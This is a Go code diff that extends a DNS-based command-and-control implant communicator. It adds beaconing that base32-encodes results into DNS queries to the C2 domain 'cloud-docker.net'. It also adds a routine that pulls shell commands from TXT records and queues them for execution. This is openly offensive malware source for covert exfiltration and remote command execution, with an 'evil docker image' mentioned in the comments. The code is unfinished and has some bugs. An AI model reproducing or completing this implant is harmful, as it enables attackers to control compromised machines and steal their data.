@@ -6,19 +6,24 @@ import (
 	"fmt"
 	"github.com/miekg/dns"
 	"log"
+	"strconv"
 	"strings"
+	"time"
 )
 
 // TODO: all communications (commands + results) should be encoded + decoded + encrypted -> verify this at the end
 // TODO: want flags? - or just write comment saying if we wanna change these hardcoded values in the implant, we can just change the evil docker image
 var (
+	// TODO: move this to DNSC2Communicaotr fields
 	domain = flag.String("domain", "cloud-docker.net", "C2 domain to query")
 	// TODO: look at this
 	server = flag.String("server", "8.8.8.8:53", "DNS server addr (ip:port)")
 )
 
 // TODO: only cmd tasks supported in DNSImplant at the time?
-type DNSC2Communicator struct{}
+type DNSC2Communicator struct {
+	client *dns.Client // TODO: make sure I use this instead of fresh initializing a client
+}
 
 /*
 	// TODO: move this somewhere else
@@ -67,52 +72,108 @@ func (D *DNSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQueue
 				totalChunkCount, // total chunks → "02", "03", …
 				index+1,         // this chunk’s index → "01", "02", …
 				chunk,           // the Base32 payload slice
-				*domain,         // your root domain
+				*domain,         // root domain
 			)
 			fqdn := dns.Fqdn(qname)
 
 			log.Printf("LOG DETAILED MESSAGE IN HERE")
-		}
+			msg := new(dns.Msg)
+			msg.SetQuestion(fqdn, dns.TypeTXT)
 
-		if result.Success {
-			numLabels := 8
-			remainingLen := 255 - numLabels - 1
-			questions := make([]string, 0)
-			if len([]byte(result.Content)) > remainingLen {
-				// divide - have multiple questions ready
-				//
-			} else {
-				questions = append(questions, dns.Fqdn(fmt.Sprintf("%s.%02d.%s", implantID, result.TaskID, domain))) // do %02d for the implantID as well?
+			_, _, err := new(dns.Client).Exchange(msg, *server)
+			if err != nil {
+				// return fmt.Errorf("DNS exchange failed for %q: %w", fqdn, err)
+				// TODO: standardize error handling
 			}
-			for _, question := range questions {
-				m := new(dns.Msg)
-				m.SetQuestion(question, dns.TypeTXT)
-				fmt.Printf(question)
-				_, _, err := new(dns.Client).Exchange(m, *server)
-				if err != nil { // TODO: have server send success in in instead?
-					panic(err) // TODO: fix error handling
-				}
-			}
-		} else {
-			// TODO -> handle this, c2 server still needs to receive a result to know it failed
+
+			// optional throttle to avoid flooding
+			time.Sleep(50 * time.Millisecond)
 		}
 	}
 
 	// 2. get new tasks from DNS server, make them into TaskQueue
-	return NewTaskQueue(), nil
+	// NOTE: Only the ShellCommand Task is currently supported for DNS - #TODO: add at top or smthing
+
+	tq := NewTaskQueue()
+	commands, err := D.GetRequestedCommands(implantID)
+	if err != nil {
+		return nil, err
+	}
+
+	for id, commandWithArgs := range commands {
+		tq.Enqueue(NewShellCommandTask(id, commandWithArgs))
+	}
+
+	return tq, nil
 }
 
-func b32Encoder(data string) string {
-	b32 := base32.StdEncoding.WithPadding(base32.NoPadding)
-	return b32.EncodeToString([]byte(data))
-}
+// TODO: make implantID a field in DNS-2Communicator - so dont have to pass it in, same for HTTPSCommunicator?
+// func (D *DNSC2Communicator) PostResults(implantID uint, results []Result) (*TaskQueue, error) {}
 
-func b32Decoder(encodedData string) (string, error) {
-	lowercaseEncodedData := strings.ToLower(encodedData)
-	data, err := base32.StdEncoding.DecodeString(lowercaseEncodedData)
-	return string(data), err
+// GetRequestedCommands fetches all pending tasks in one DNS response.
+// It does a UDP query, and if the response is truncated it retries over TCP.
+// Each TXT RR must be "<id>:<base32_no_pad(command)>".
+func (d *DNSC2Communicator) GetRequestedCommands(implantID uint) (map[uint][]string, error) {
+
+	cmds := make(map[uint][]string)
+	decoder := base32.StdEncoding.WithPadding(base32.NoPadding)
+	// TODO: make sure to reassemble BEFORE splitting on :
+
+	msg := new(dns.Msg)
+	fq := dns.Fqdn(fmt.Sprintf("%d.cmd.%s", implantID, domain))
+	msg.SetQuestion(fq, dns.TypeTXT)
+	msg.SetEdns0(4096, true) // advertise a larger UDP payload
+
+	// 1) First try over UDP
+	d.client.Net = "udp"
+	reply, _, err := d.client.Exchange(msg, *server)
+	if err != nil {
+		return nil, fmt.Errorf("DNS exchange (UDP) error: %w", err)
+	}
+
+	// 2) If truncated, retry over TCP
+	if reply.Truncated { // TODO: make sure that if it does be truncated and  does the query again, it will get the exact same tasks to execute - or does server make them "done" immediately
+		d.client.Net = "tcp"
+		reply, _, err = d.client.Exchange(msg, *server)
+		if err != nil {
+			return nil, fmt.Errorf("DNS exchange (TCP) error: %w", err)
+		}
+	}
+
+	// the reason we dont use index is bc DNS can send the RR in different order, want to make sure we are in sync w server regarding correct ID
+	for _, rr := range reply.Answer { // Answer is of type []RR - each one its own individual task
+		txt, ok := rr.(*dns.TXT)
+		if !ok || len(txt.Txt) == 0 { // TODO: if was of a different type, or no tasks ready?? handle the !ok error?
+			continue
+		}
+
+		// will join any 255-byte chunks into one string
+		raw := strings.Join(txt.Txt, "")
+		data, err := decoder.DecodeString(raw) // TODO: why is it lightgreen!!
+		if err != nil {
+			return nil, err
+		}
+		payload := string(data)
+
+		parts := strings.SplitN(payload, ":", 2)
+		if len(parts) != 2 {
+			return nil, fmt.Errorf("invalid TXT format %q, want <id>:<base32-cmd>", payload)
+		}
+
+		id64, err := strconv.ParseUint(parts[0], 10, 64)
+		if err != nil {
+			return nil, fmt.Errorf("invalid task ID %q: %w", parts[0], err)
+		}
+		id := uint(id64)
+		cmd := parts[1]                // cmd with arguments
+		cmds[id] = strings.Fields(cmd) // separate out by " "
+	}
+
+	return cmds, nil
 }
 
 func NewDNSC2Communicator() *DNSC2Communicator {
-	return &DNSC2Communicator{}
+	return &DNSC2Communicator{
+		client: &dns.Client{},
+	}
 }
